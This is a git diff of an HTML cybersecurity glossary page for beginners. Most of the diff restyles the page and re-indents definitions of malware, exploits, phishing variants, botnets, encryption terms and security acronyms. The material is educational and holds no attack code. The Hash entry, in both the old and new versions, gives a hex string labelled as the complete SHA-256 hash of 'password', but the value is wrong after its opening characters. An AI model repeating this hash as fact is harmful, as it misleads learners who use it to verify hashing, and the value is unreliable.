@@ -7,7 +7,7 @@
     
     <meta name="description" content="Essential cybersecurity terminology and definitions. A comprehensive glossary of security terms every beginner needs to know.">
     <meta name="author" content="lokii (UnExplainableFish52)">
-    <meta name="theme-color" content="#0d1117">
+    <meta name="theme-color" content="#050505">
     
     <!-- Open Graph / Facebook -->
     <meta property="og:type" content="article">
@@ -30,74 +30,37 @@
     <link rel="manifest" href="/site.webmanifest">
     <link rel="icon" href="/favicon.ico">
     
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    
+    <!-- Centralized Styles -->
+    <link rel="stylesheet" href="../../css/style.css">
+    
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            background: #0d1117;
-            color: #e6edf3;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            line-height: 1.7;
-            min-height: 100vh;
-        }
-
-        .container {
-            max-width: 1100px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-
-        /* Navigation */
-        .nav-bar {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 15px 0;
-            border-bottom: 1px solid #30363d;
-            margin-bottom: 40px;
-        }
-
-        .nav-link {
-            color: #00bcd4;
-            text-decoration: none;
-            font-weight: bold;
-            padding: 8px 16px;
-            border-radius: 6px;
-            transition: all 0.3s ease;
-        }
-
-        .nav-link:hover {
-            background: rgba(0, 188, 212, 0.15);
-        }
-
-        .breadcrumb {
-            color: #8b949e;
-            font-size: 0.9em;
-        }
-
-        .breadcrumb a {
-            color: #00bcd4;
-            text-decoration: none;
-        }
-
-        /* Header */
-        header {
+        /* Page-specific styles for glossary content */
+        .notes-header {
             text-align: center;
             padding: 40px 20px;
             margin-bottom: 30px;
         }
 
-        h1 {
+        .notes-header h1 {
             font-size: 2.5em;
             color: #00bcd4;
             font-weight: bold;
             margin-bottom: 15px;
+            border: none;
+            padding: 0;
         }
 
+        .subtitle {
+            color: #8b949e;
+            font-size: 1.1em;
+        }
+
+        /* Content headings */
         h2 {
             font-size: 1.8em;
             color: #00bcd4;
@@ -121,9 +84,17 @@
             margin: 20px 0 10px;
         }
 
-        .subtitle {
-            color: #8b949e;
-            font-size: 1.1em;
+        .highlight {
+            color: #ffd700;
+            font-weight: bold;
+        }
+
+        .code-text {
+            color: #4ec9b0;
+            font-family: 'JetBrains Mono', 'Consolas', monospace;
+            background: rgba(78, 201, 176, 0.1);
+            padding: 2px 6px;
+            border-radius: 4px;
         }
 
         /* Quick Jump */
@@ -168,19 +139,6 @@
             border-radius: 12px;
             padding: 30px;
             margin-bottom: 30px;
-        }
-
-        .highlight {
-            color: #ffd700;
-            font-weight: bold;
-        }
-
-        .code-text {
-            color: #4ec9b0;
-            font-family: 'Consolas', 'Monaco', monospace;
-            background: rgba(78, 201, 176, 0.1);
-            padding: 2px 6px;
-            border-radius: 4px;
         }
 
         /* Term Definition */
@@ -228,34 +186,9 @@
 
         .code-block code {
             color: #4ec9b0;
-            font-family: 'Consolas', 'Monaco', monospace;
+            font-family: 'JetBrains Mono', 'Consolas', monospace;
             font-size: 0.9em;
             line-height: 1.5;
-        }
-
-        /* Tables */
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            margin: 20px 0;
-            font-size: 0.9em;
-        }
-
-        th {
-            background: rgba(0, 188, 212, 0.2);
-            color: #00bcd4;
-            padding: 12px;
-            text-align: left;
-            border-bottom: 2px solid #00bcd4;
-        }
-
-        td {
-            padding: 12px;
-            border-bottom: 1px solid #30363d;
-        }
-
-        tr:hover {
-            background: rgba(0, 188, 212, 0.05);
         }
 
         /* Info Box */
@@ -303,7 +236,7 @@
         }
 
         /* Footer */
-        footer {
+        .notes-footer {
             text-align: center;
             padding: 40px 20px;
             margin-top: 60px;
@@ -313,687 +246,583 @@
 
         /* Responsive */
         @media (max-width: 768px) {
-            h1 {
-                font-size: 1.8em;
-            }
-
-            h2 {
-                font-size: 1.5em;
-            }
-
-            .page-nav {
-                flex-direction: column;
-                gap: 15px;
-            }
-
-            .page-nav a {
-                width: 100%;
-                justify-content: center;
-            }
-
-            table {
-                font-size: 0.8em;
-            }
-
-            th, td {
-                padding: 8px;
-            }
-
-            .scroll-to-top-btn {
-                width: 45px;
-                height: 45px;
-                font-size: 1.25rem;
-                bottom: 16px;
-                right: 16px;
-            }
-        }
-
-        /* Scroll to Top Button */
-        .scroll-to-top-btn {
-            position: fixed;
-            bottom: 24px;
-            right: 24px;
-            width: 50px;
-            height: 50px;
-            border-radius: 50%;
-            background: linear-gradient(135deg, #00bcd4, #0099aa);
-            color: white;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 1.5rem;
-            box-shadow: 0 10px 15px rgba(0, 0, 0, 0.5);
-            transition: all 0.25s ease-in-out;
-            z-index: 99;
-            cursor: pointer;
-            border: none;
-            opacity: 0;
-            visibility: hidden;
-            transform: translateY(20px);
-        }
-
-        .scroll-to-top-btn.visible {
-            opacity: 1;
-            visibility: visible;
-            transform: translateY(0);
-        }
-
-        .scroll-to-top-btn:hover {
-            background: linear-gradient(135deg, #0099aa, #007788);
-            transform: scale(1.1) translateY(0);
-            box-shadow: 0 15px 30px rgba(0, 188, 212, 0.4);
-        }
-        /* Site Header - Homepage Style */
-        .site-header {
-            padding: 15px 20px;
-            border-bottom: 1px solid #30363d;
-            background: rgba(13, 17, 23, 0.95);
-            backdrop-filter: blur(10px);
-            position: sticky;
-            top: 0;
-            z-index: 100;
-        }
-
-        .header-content {
-            max-width: 1100px;
-            margin: 0 auto;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .branding {
-            text-decoration: none;
-        }
-
-        .branding .logo {
-            color: #00bcd4;
-            font-size: 1.5rem;
-            font-weight: 800;
-        }
-
-        .site-nav {
-            display: flex;
-            gap: 25px;
-            align-items: center;
-        }
-
-        .site-nav .nav-link {
-            color: #8b949e;
-            text-decoration: none;
-            font-weight: 500;
-            transition: color 0.3s ease;
-        }
-
-        .site-nav .nav-link:hover {
-            color: #00bcd4;
+            .notes-header h1 { font-size: 1.8em; }
+            h2 { font-size: 1.5em; }
+            .page-nav { flex-direction: column; gap: 15px; }
+            .page-nav a { width: 100%; justify-content: center; }
+            table { font-size: 0.8em; }
+            th, td { padding: 8px; }
         }
     </style>
 </head>
 <body>
-    <!-- Site Header -->
+    <!-- Persistent Navigation (matches index.html) -->
     <header class="site-header">
-        <div class="header-content">
-            <a href="../../index.html" class="branding">
-                <span class="logo">lokii.tech</span>
-            </a>
-            <nav class="site-nav">
-                <a href="../../index.html#about" class="nav-link">About</a>
-                <a href="../../index.html#resources" class="nav-link">Resources</a>
-                <a href="https://github.com/UnExplainableFish52" target="_blank" class="nav-link">GitHub</a>
-            </nav>
+        <div class="container">
+            <div class="header-content">
+                <a href="../../index.html" class="branding">
+                    <span class="logo" style="color: #00e5ff; font-size: 1.7rem; font-weight: 800; text-shadow: 0 0 20px rgba(0, 229, 255, 0.4);">lokii.tech</span>
+                </a>
+                <nav class="nav-links" style="gap: 2rem;">
+                    <a href="../../index.html#about" class="nav-link nav-link-enhanced">About</a>
+                    <a href="../../index.html#resources" class="nav-link nav-link-enhanced">Resources</a>
+                    <a href="https://github.com/UnExplainableFish52/lokii.tech" target="_blank" class="nav-link nav-link-enhanced">GitHub</a>
+                    <a href="https://github.com/UnExplainableFish52/lokii.tech/issues" target="_blank" class="nav-link nav-contribute">Contribute ✨</a>
+                </nav>
+            </div>
         </div>
     </header>
 
-    <div class="container">
-        <header>
-            <h1>📖 1.2 Cybersecurity Glossary</h1>
-            <p class="subtitle">Your comprehensive A-Z reference for cybersecurity terminology</p>
-        </header>
+    <main>
+        <div class="container">
+            <header class="notes-header">
+                <h1>📖 1.2 Cybersecurity Glossary</h1>
+                <p class="subtitle">Your comprehensive A-Z reference for cybersecurity terminology</p>
+            </header>
 
-        <!-- Quick Jump Navigation -->
-        <div class="quick-jump">
-            <h3>🔍 Quick Jump</h3>
-            <div class="quick-jump-links">
-                <a href="#common-terms">Common Terms</a>
-                <a href="#acronyms">Acronyms</a>
-                <a href="#attack-types">Attack Types</a>
-                <a href="#network-defense">Network & Defense</a>
-            </div>
-        </div>
-
-        <!-- Common Terms Section -->
-        <h2 id="common-terms">🦠 Common Terms</h2>
-
-        <div class="glossary-section">
-            <h3>Malware Types</h3>
-            
-            <div class="term">
-                <div class="term-name">Malware</div>
-                <div class="term-def">
-                    Short for "malicious software." An umbrella term for any software intentionally designed to cause damage 
-                    to a computer, server, network, or user. Includes viruses, worms, trojans, ransomware, and more.
-                </div>
-                <div class="term-example">
-                    Example: The WannaCry ransomware infected over 200,000 computers worldwide in 2017.
+            <!-- Quick Jump Navigation -->
+            <div class="quick-jump">
+                <h3>🔍 Quick Jump</h3>
+                <div class="quick-jump-links">
+                    <a href="#common-terms">Common Terms</a>
+                    <a href="#acronyms">Acronyms</a>
+                    <a href="#attack-types">Attack Types</a>
+                    <a href="#network-defense">Network & Defense</a>
                 </div>
             </div>
 
-            <div class="term">
-                <div class="term-name">Virus</div>
-                <div class="term-def">
-                    A type of malware that attaches itself to a legitimate program or file and <span class="highlight">requires user action</span> 
-                    to spread (like running an infected program). It can replicate and modify other programs.
-                </div>
-                <div class="term-example">
-                    Example: The ILOVEYOU virus (2000) spread via email attachments, infecting millions of computers.
-                </div>
-            </div>
+            <!-- Common Terms Section -->
+            <h2 id="common-terms">🦠 Common Terms</h2>
 
-            <div class="term">
-                <div class="term-name">Worm</div>
-                <div class="term-def">
-                    A self-replicating malware that spreads <span class="highlight">automatically</span> across networks 
-                    without requiring user interaction. Unlike viruses, worms don't need to attach to programs.
+            <div class="glossary-section">
+                <h3>Malware Types</h3>
+                
+                <div class="term">
+                    <div class="term-name">Malware</div>
+                    <div class="term-def">
+                        Short for "malicious software." An umbrella term for any software intentionally designed to cause damage 
+                        to a computer, server, network, or user. Includes viruses, worms, trojans, ransomware, and more.
+                    </div>
+                    <div class="term-example">
+                        Example: The WannaCry ransomware infected over 200,000 computers worldwide in 2017.
+                    </div>
                 </div>
-                <div class="term-example">
-                    Example: The Conficker worm infected millions of computers by exploiting Windows vulnerabilities.
-                </div>
-            </div>
 
-            <div class="term">
-                <div class="term-name">Trojan (Trojan Horse)</div>
-                <div class="term-def">
-                    Malware disguised as legitimate software that tricks users into installing it. Once installed, it 
-                    can create backdoors, steal data, or download additional malware. Named after the Greek myth.
+                <div class="term">
+                    <div class="term-name">Virus</div>
+                    <div class="term-def">
+                        A type of malware that attaches itself to a legitimate program or file and <span class="highlight">requires user action</span> 
+                        to spread (like running an infected program). It can replicate and modify other programs.
+                    </div>
+                    <div class="term-example">
+                        Example: The ILOVEYOU virus (2000) spread via email attachments, infecting millions of computers.
+                    </div>
                 </div>
-                <div class="term-example">
-                    Example: A fake "Adobe Flash Update" that actually installs a keylogger to steal passwords.
-                </div>
-            </div>
 
-            <div class="term">
-                <div class="term-name">Ransomware</div>
-                <div class="term-def">
-                    Malware that encrypts a victim's files and demands payment (ransom) for the decryption key. 
-                    Often paid in cryptocurrency for anonymity. One of the most financially damaging threats today.
+                <div class="term">
+                    <div class="term-name">Worm</div>
+                    <div class="term-def">
+                        A self-replicating malware that spreads <span class="highlight">automatically</span> across networks 
+                        without requiring user interaction. Unlike viruses, worms don't need to attach to programs.
+                    </div>
+                    <div class="term-example">
+                        Example: The Conficker worm infected millions of computers by exploiting Windows vulnerabilities.
+                    </div>
                 </div>
-                <div class="term-example">
-                    Example: LockBit, REvil, and Conti are notorious ransomware groups that have extorted billions of dollars.
-                </div>
-            </div>
 
-            <div class="term">
-                <div class="term-name">Spyware</div>
-                <div class="term-def">
-                    Malware designed to secretly monitor and collect information about a user's activities without 
-                    their knowledge. Can capture keystrokes, screenshots, browsing history, and more.
+                <div class="term">
+                    <div class="term-name">Trojan (Trojan Horse)</div>
+                    <div class="term-def">
+                        Malware disguised as legitimate software that tricks users into installing it. Once installed, it 
+                        can create backdoors, steal data, or download additional malware. Named after the Greek myth.
+                    </div>
+                    <div class="term-example">
+                        Example: A fake "Adobe Flash Update" that actually installs a keylogger to steal passwords.
+                    </div>
                 </div>
-                <div class="term-example">
-                    Example: Pegasus spyware developed by NSO Group, used to spy on journalists and activists.
-                </div>
-            </div>
 
-            <div class="term">
-                <div class="term-name">Adware</div>
-                <div class="term-def">
-                    Software that automatically displays or downloads advertising material, often without the user's consent. 
-                    While sometimes just annoying, it can also be a vector for more malicious software.
+                <div class="term">
+                    <div class="term-name">Ransomware</div>
+                    <div class="term-def">
+                        Malware that encrypts a victim's files and demands payment (ransom) for the decryption key. 
+                        Often paid in cryptocurrency for anonymity. One of the most financially damaging threats today.
+                    </div>
+                    <div class="term-example">
+                        Example: LockBit, REvil, and Conti are notorious ransomware groups that have extorted billions of dollars.
+                    </div>
                 </div>
-                <div class="term-example">
-                    Example: Browser toolbars that display unwanted ads and redirect your searches.
-                </div>
-            </div>
 
-            <div class="term">
-                <div class="term-name">Rootkit</div>
-                <div class="term-def">
-                    A stealthy type of malware designed to hide the existence of certain processes or programs from normal 
-                    detection methods. Operates at a deep system level, often in the kernel or firmware.
+                <div class="term">
+                    <div class="term-name">Spyware</div>
+                    <div class="term-def">
+                        Malware designed to secretly monitor and collect information about a user's activities without 
+                        their knowledge. Can capture keystrokes, screenshots, browsing history, and more.
+                    </div>
+                    <div class="term-example">
+                        Example: Pegasus spyware developed by NSO Group, used to spy on journalists and activists.
+                    </div>
                 </div>
-                <div class="term-example">
-                    Example: The Sony BMG rootkit (2005) was secretly installed on computers through music CDs.
-                </div>
-            </div>
 
-            <h3>Vulnerabilities & Exploits</h3>
+                <div class="term">
+                    <div class="term-name">Adware</div>
+                    <div class="term-def">
+                        Software that automatically displays or downloads advertising material, often without the user's consent. 
+                        While sometimes just annoying, it can also be a vector for more malicious software.
+                    </div>
+                    <div class="term-example">
+                        Example: Browser toolbars that display unwanted ads and redirect your searches.
+                    </div>
+                </div>
 
-            <div class="term">
-                <div class="term-name">Vulnerability</div>
-                <div class="term-def">
-                    A weakness or flaw in a system, application, or process that could be exploited by an attacker. 
-                    Can exist in software code, configurations, or human processes.
+                <div class="term">
+                    <div class="term-name">Rootkit</div>
+                    <div class="term-def">
+                        A stealthy type of malware designed to hide the existence of certain processes or programs from normal 
+                        detection methods. Operates at a deep system level, often in the kernel or firmware.
+                    </div>
+                    <div class="term-example">
+                        Example: The Sony BMG rootkit (2005) was secretly installed on computers through music CDs.
+                    </div>
                 </div>
-                <div class="term-example">
-                    Example: A buffer overflow vulnerability in a web server that allows code execution.
-                </div>
-            </div>
 
-            <div class="term">
-                <div class="term-name">Exploit</div>
-                <div class="term-def">
-                    A piece of code, software, or technique that takes advantage of a vulnerability to cause unintended 
-                    behavior, such as gaining unauthorized access or executing malicious code.
-                </div>
-                <div class="term-example">
-                    Example: The EternalBlue exploit was used by WannaCry to spread across networks.
-                </div>
-            </div>
+                <h3>Vulnerabilities & Exploits</h3>
 
-            <div class="term">
-                <div class="term-name">Zero-Day (0-day)</div>
-                <div class="term-def">
-                    A vulnerability that is unknown to the software vendor and has no patch available. Called "zero-day" 
-                    because developers have had "zero days" to fix it. Extremely valuable to attackers and defenders.
+                <div class="term">
+                    <div class="term-name">Vulnerability</div>
+                    <div class="term-def">
+                        A weakness or flaw in a system, application, or process that could be exploited by an attacker. 
+                        Can exist in software code, configurations, or human processes.
+                    </div>
+                    <div class="term-example">
+                        Example: A buffer overflow vulnerability in a web server that allows code execution.
+                    </div>
                 </div>
-                <div class="term-example">
-                    Example: The Log4Shell vulnerability (CVE-2021-44228) was a critical zero-day affecting millions of systems.
-                </div>
-            </div>
 
-            <div class="term">
-                <div class="term-name">Payload</div>
-                <div class="term-def">
-                    The component of an exploit or malware that performs the malicious action. The exploit delivers the 
-                    payload, which could be a reverse shell, ransomware, data stealer, etc.
+                <div class="term">
+                    <div class="term-name">Exploit</div>
+                    <div class="term-def">
+                        A piece of code, software, or technique that takes advantage of a vulnerability to cause unintended 
+                        behavior, such as gaining unauthorized access or executing malicious code.
+                    </div>
+                    <div class="term-example">
+                        Example: The EternalBlue exploit was used by WannaCry to spread across networks.
+                    </div>
                 </div>
-                <div class="term-example">
-                    Example: A SQL injection exploit might deliver a payload that dumps the entire database.
-                </div>
-            </div>
 
-            <div class="term">
-                <div class="term-name">Backdoor</div>
-                <div class="term-def">
-                    A hidden method of bypassing normal authentication or security controls to gain access to a system. 
-                    Can be intentionally built in (by developers) or installed by attackers.
+                <div class="term">
+                    <div class="term-name">Zero-Day (0-day)</div>
+                    <div class="term-def">
+                        A vulnerability that is unknown to the software vendor and has no patch available. Called "zero-day" 
+                        because developers have had "zero days" to fix it. Extremely valuable to attackers and defenders.
+                    </div>
+                    <div class="term-example">
+                        Example: The Log4Shell vulnerability (CVE-2021-44228) was a critical zero-day affecting millions of systems.
+                    </div>
                 </div>
-                <div class="term-example">
-                    Example: After compromising a server, an attacker might install a backdoor for persistent access.
-                </div>
-            </div>
 
-            <h3>Social Engineering</h3>
+                <div class="term">
+                    <div class="term-name">Payload</div>
+                    <div class="term-def">
+                        The component of an exploit or malware that performs the malicious action. The exploit delivers the 
+                        payload, which could be a reverse shell, ransomware, data stealer, etc.
+                    </div>
+                    <div class="term-example">
+                        Example: A SQL injection exploit might deliver a payload that dumps the entire database.
+                    </div>
+                </div>
 
-            <div class="term">
-                <div class="term-name">Phishing</div>
-                <div class="term-def">
-                    A social engineering attack using fraudulent emails, messages, or websites to trick victims into 
-                    revealing sensitive information (passwords, credit cards) or installing malware.
+                <div class="term">
+                    <div class="term-name">Backdoor</div>
+                    <div class="term-def">
+                        A hidden method of bypassing normal authentication or security controls to gain access to a system. 
+                        Can be intentionally built in (by developers) or installed by attackers.
+                    </div>
+                    <div class="term-example">
+                        Example: After compromising a server, an attacker might install a backdoor for persistent access.
+                    </div>
                 </div>
-                <div class="term-example">
-                    Example: An email pretending to be from your bank asking you to "verify your account" via a fake link.
-                </div>
-            </div>
 
-            <div class="term">
-                <div class="term-name">Spear Phishing</div>
-                <div class="term-def">
-                    A targeted phishing attack directed at specific individuals or organizations. Uses personalized 
-                    information to make the attack more convincing and harder to detect.
-                </div>
-                <div class="term-example">
-                    Example: An email to a company's CFO, appearing to come from the CEO, requesting an urgent wire transfer.
-                </div>
-            </div>
+                <h3>Social Engineering</h3>
 
-            <div class="term">
-                <div class="term-name">Whaling</div>
-                <div class="term-def">
-                    Spear phishing specifically targeting high-profile individuals like CEOs, CFOs, or other executives 
-                    (the "big fish"). Often involves significant research and sophisticated pretexts.
+                <div class="term">
+                    <div class="term-name">Phishing</div>
+                    <div class="term-def">
+                        A social engineering attack using fraudulent emails, messages, or websites to trick victims into 
+                        revealing sensitive information (passwords, credit cards) or installing malware.
+                    </div>
+                    <div class="term-example">
+                        Example: An email pretending to be from your bank asking you to "verify your account" via a fake link.
+                    </div>
                 </div>
-                <div class="term-example">
-                    Example: An attacker impersonating a law firm sending a fake lawsuit notification to a company CEO.
-                </div>
-            </div>
 
-            <div class="term">
-                <div class="term-name">Vishing</div>
-                <div class="term-def">
-                    Voice phishing — social engineering conducted over phone calls. Attackers impersonate banks, 
-                    tech support, government agencies, or other trusted entities.
+                <div class="term">
+                    <div class="term-name">Spear Phishing</div>
+                    <div class="term-def">
+                        A targeted phishing attack directed at specific individuals or organizations. Uses personalized 
+                        information to make the attack more convincing and harder to detect.
+                    </div>
+                    <div class="term-example">
+                        Example: An email to a company's CFO, appearing to come from the CEO, requesting an urgent wire transfer.
+                    </div>
                 </div>
-                <div class="term-example">
-                    Example: A caller claiming to be from Microsoft Tech Support, saying your computer has a virus.
-                </div>
-            </div>
 
-            <div class="term">
-                <div class="term-name">Smishing</div>
-                <div class="term-def">
-                    SMS phishing — social engineering conducted via text messages. Often contains malicious links 
-                    or requests for sensitive information.
+                <div class="term">
+                    <div class="term-name">Whaling</div>
+                    <div class="term-def">
+                        Spear phishing specifically targeting high-profile individuals like CEOs, CFOs, or other executives 
+                        (the "big fish"). Often involves significant research and sophisticated pretexts.
+                    </div>
+                    <div class="term-example">
+                        Example: An attacker impersonating a law firm sending a fake lawsuit notification to a company CEO.
+                    </div>
                 </div>
-                <div class="term-example">
-                    Example: A text claiming "Your package couldn't be delivered. Click here to reschedule."
-                </div>
-            </div>
 
-            <div class="term">
-                <div class="term-name">Social Engineering</div>
-                <div class="term-def">
-                    The psychological manipulation of people into performing actions or divulging confidential information. 
-                    Exploits human nature rather than technical vulnerabilities.
+                <div class="term">
+                    <div class="term-name">Vishing</div>
+                    <div class="term-def">
+                        Voice phishing — social engineering conducted over phone calls. Attackers impersonate banks, 
+                        tech support, government agencies, or other trusted entities.
+                    </div>
+                    <div class="term-example">
+                        Example: A caller claiming to be from Microsoft Tech Support, saying your computer has a virus.
+                    </div>
                 </div>
-                <div class="term-example">
-                    Example: Calling IT support and pretending to be a new employee who forgot their password.
-                </div>
-            </div>
 
-            <div class="term">
-                <div class="term-name">Pretexting</div>
-                <div class="term-def">
-                    Creating a fabricated scenario (pretext) to engage a victim and gain their trust. The attacker 
-                    assumes a false identity to manipulate the target into providing information.
+                <div class="term">
+                    <div class="term-name">Smishing</div>
+                    <div class="term-def">
+                        SMS phishing — social engineering conducted via text messages. Often contains malicious links 
+                        or requests for sensitive information.
+                    </div>
+                    <div class="term-example">
+                        Example: A text claiming "Your package couldn't be delivered. Click here to reschedule."
+                    </div>
                 </div>
-                <div class="term-example">
-                    Example: An attacker calling as a "vendor" to verify "account details" before processing a payment.
-                </div>
-            </div>
 
-            <div class="term">
-                <div class="term-name">Baiting</div>
-                <div class="term-def">
-                    Luring victims with something enticing, like free software, USB drives, or prize offers. 
-                    Often involves physical media or too-good-to-be-true digital offers.
+                <div class="term">
+                    <div class="term-name">Social Engineering</div>
+                    <div class="term-def">
+                        The psychological manipulation of people into performing actions or divulging confidential information. 
+                        Exploits human nature rather than technical vulnerabilities.
+                    </div>
+                    <div class="term-example">
+                        Example: Calling IT support and pretending to be a new employee who forgot their password.
+                    </div>
                 </div>
-                <div class="term-example">
-                    Example: Leaving infected USB drives in a company parking lot, hoping employees will plug them in.
-                </div>
-            </div>
 
-            <div class="term">
-                <div class="term-name">Tailgating (Piggybacking)</div>
-                <div class="term-def">
-                    Gaining physical access to a restricted area by following behind an authorized person. 
-                    Exploits social norms like holding doors open.
+                <div class="term">
+                    <div class="term-name">Pretexting</div>
+                    <div class="term-def">
+                        Creating a fabricated scenario (pretext) to engage a victim and gain their trust. The attacker 
+                        assumes a false identity to manipulate the target into providing information.
+                    </div>
+                    <div class="term-example">
+                        Example: An attacker calling as a "vendor" to verify "account details" before processing a payment.
+                    </div>
                 </div>
-                <div class="term-example">
-                    Example: Carrying boxes and asking an employee to hold the door to a secure data center.
-                </div>
-            </div>
 
-            <h3>Command & Control</h3>
+                <div class="term">
+                    <div class="term-name">Baiting</div>
+                    <div class="term-def">
+                        Luring victims with something enticing, like free software, USB drives, or prize offers. 
+                        Often involves physical media or too-good-to-be-true digital offers.
+                    </div>
+                    <div class="term-example">
+                        Example: Leaving infected USB drives in a company parking lot, hoping employees will plug them in.
+                    </div>
+                </div>
 
-            <div class="term">
-                <div class="term-name">Botnet</div>
-                <div class="term-def">
-                    A network of compromised computers (bots/zombies) controlled by an attacker. Used for DDoS attacks, 
-                    spam campaigns, cryptocurrency mining, and other malicious activities.
+                <div class="term">
+                    <div class="term-name">Tailgating (Piggybacking)</div>
+                    <div class="term-def">
+                        Gaining physical access to a restricted area by following behind an authorized person. 
+                        Exploits social norms like holding doors open.
+                    </div>
+                    <div class="term-example">
+                        Example: Carrying boxes and asking an employee to hold the door to a secure data center.
+                    </div>
                 </div>
-                <div class="term-example">
-                    Example: The Mirai botnet compromised IoT devices to launch massive DDoS attacks.
-                </div>
-            </div>
 
-            <div class="term">
-                <div class="term-name">C2/C&C Server (Command and Control)</div>
-                <div class="term-def">
-                    A server used by attackers to communicate with and control compromised systems. Sends commands 
-                    to malware and receives stolen data from infected machines.
-                </div>
-                <div class="term-example">
-                    Example: Malware phones home to a C2 server to receive instructions and exfiltrate data.
-                </div>
-            </div>
+                <h3>Command & Control</h3>
 
-            <div class="term">
-                <div class="term-name">Zombie</div>
-                <div class="term-def">
-                    A computer that has been compromised and is being controlled remotely, usually as part of a botnet. 
-                    The user is typically unaware their system is compromised.
+                <div class="term">
+                    <div class="term-name">Botnet</div>
+                    <div class="term-def">
+                        A network of compromised computers (bots/zombies) controlled by an attacker. Used for DDoS attacks, 
+                        spam campaigns, cryptocurrency mining, and other malicious activities.
+                    </div>
+                    <div class="term-example">
+                        Example: The Mirai botnet compromised IoT devices to launch massive DDoS attacks.
+                    </div>
                 </div>
-                <div class="term-example">
-                    Example: An infected home computer being used to send spam or participate in DDoS attacks.
-                </div>
-            </div>
 
-            <h3>Cryptography Terms</h3>
-
-            <div class="term">
-                <div class="term-name">Hash</div>
-                <div class="term-def">
-                    A fixed-size string produced by a hash function that represents data. Hashes are one-way 
-                    (you can't reverse them to get the original data) and are used for integrity verification and password storage.
+                <div class="term">
+                    <div class="term-name">C2/C&C Server (Command and Control)</div>
+                    <div class="term-def">
+                        A server used by attackers to communicate with and control compromised systems. Sends commands 
+                        to malware and receives stolen data from infected machines.
+                    </div>
+                    <div class="term-example">
+                        Example: Malware phones home to a C2 server to receive instructions and exfiltrate data.
+                    </div>
                 </div>
-                <div class="code-block">
-                    <code>
+
+                <div class="term">
+                    <div class="term-name">Zombie</div>
+                    <div class="term-def">
+                        A computer that has been compromised and is being controlled remotely, usually as part of a botnet. 
+                        The user is typically unaware their system is compromised.
+                    </div>
+                    <div class="term-example">
+                        Example: An infected home computer being used to send spam or participate in DDoS attacks.
+                    </div>
+                </div>
+
+                <h3>Cryptography Terms</h3>
+
+                <div class="term">
+                    <div class="term-name">Hash</div>
+                    <div class="term-def">
+                        A fixed-size string produced by a hash function that represents data. Hashes are one-way 
+                        (you can't reverse them to get the original data) and are used for integrity verification and password storage.
+                    </div>
+                    <div class="code-block">
+                        <code>
 # Example SHA-256 hash of "password" (complete 64-character hex string)<br>
 5e884898da28047d91ef90d2a6ee69a2a3c0f635e5b9a7c2b8d8f63e5b1a8c9d
-                    </code>
+                        </code>
+                    </div>
+                </div>
+
+                <div class="term">
+                    <div class="term-name">Encryption</div>
+                    <div class="term-def">
+                        The process of converting plaintext data into ciphertext using an algorithm and key. 
+                        Only those with the correct key can decrypt and read the original data.
+                    </div>
+                    <div class="term-example">
+                        Example: HTTPS uses TLS encryption to protect your data while browsing websites.
+                    </div>
+                </div>
+
+                <div class="term">
+                    <div class="term-name">Decryption</div>
+                    <div class="term-def">
+                        The reverse process of encryption — converting ciphertext back into readable plaintext 
+                        using the appropriate decryption key.
+                    </div>
+                </div>
+
+                <div class="term">
+                    <div class="term-name">Cipher</div>
+                    <div class="term-def">
+                        An algorithm for performing encryption or decryption. Examples include AES (Advanced Encryption Standard), 
+                        RSA, and Blowfish.
+                    </div>
+                    <div class="term-example">
+                        Example: AES-256 is a widely used symmetric cipher considered secure for sensitive data.
+                    </div>
+                </div>
+
+                <div class="term">
+                    <div class="term-name">Plaintext</div>
+                    <div class="term-def">
+                        Data in its original, readable form before encryption. Also called "cleartext."
+                    </div>
+                </div>
+
+                <div class="term">
+                    <div class="term-name">Ciphertext</div>
+                    <div class="term-def">
+                        Data that has been encrypted and is unreadable without the proper decryption key.
+                    </div>
                 </div>
             </div>
 
-            <div class="term">
-                <div class="term-name">Encryption</div>
-                <div class="term-def">
-                    The process of converting plaintext data into ciphertext using an algorithm and key. 
-                    Only those with the correct key can decrypt and read the original data.
-                </div>
-                <div class="term-example">
-                    Example: HTTPS uses TLS encryption to protect your data while browsing websites.
-                </div>
+            <!-- Acronyms Section -->
+            <h2 id="acronyms">🔤 Acronyms & Abbreviations</h2>
+
+            <div class="glossary-section">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Acronym</th>
+                            <th>Full Form</th>
+                            <th>Description</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><span class="highlight">APT</span></td>
+                            <td>Advanced Persistent Threat</td>
+                            <td>Sophisticated, long-term cyberattacks, typically by nation-states, targeting specific organizations</td>
+                        </tr>
+                        <tr>
+                            <td><span class="highlight">CVE</span></td>
+                            <td>Common Vulnerabilities and Exposures</td>
+                            <td>A standardized identifier system for publicly known security vulnerabilities (e.g., CVE-2021-44228)</td>
+                        </tr>
+                        <tr>
+                            <td><span class="highlight">CVSS</span></td>
+                            <td>Common Vulnerability Scoring System</td>
+                            <td>A scoring system (0-10) that rates the severity of vulnerabilities</td>
+                        </tr>
+                        <tr>
+                            <td><span class="highlight">IOC</span></td>
+                            <td>Indicators of Compromise</td>
+                            <td>Artifacts that indicate a security breach (malicious IPs, file hashes, domains)</td>
+                        </tr>
+                        <tr>
+                            <td><span class="highlight">TTP</span></td>
+                            <td>Tactics, Techniques, and Procedures</td>
+                            <td>The behavior patterns and methods used by threat actors</td>
+                        </tr>
+                        <tr>
+                            <td><span class="highlight">SIEM</span></td>
+                            <td>Security Information and Event Management</td>
+                            <td>Centralized platform for collecting, analyzing, and correlating security logs (e.g., Splunk, QRadar)</td>
+                        </tr>
+                        <tr>
+                            <td><span class="highlight">EDR</span></td>
+                            <td>Endpoint Detection and Response</td>
+                            <td>Security tools that monitor endpoints for suspicious activity and enable response (e.g., CrowdStrike, Carbon Black)</td>
+                        </tr>
+                        <tr>
+                            <td><span class="highlight">XDR</span></td>
